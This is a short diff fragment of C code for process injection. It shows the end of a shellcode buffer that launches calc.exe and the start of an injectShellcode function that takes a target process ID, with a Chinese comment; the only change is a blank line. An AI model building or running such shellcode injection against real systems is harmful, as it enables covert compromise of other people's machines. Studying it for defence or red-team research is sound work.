@@ -28,6 +28,7 @@ unsigned char buf[] =
 "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
 
+
 bool injectShellcode(DWORD Target) {
 
     //获取目标进程句柄
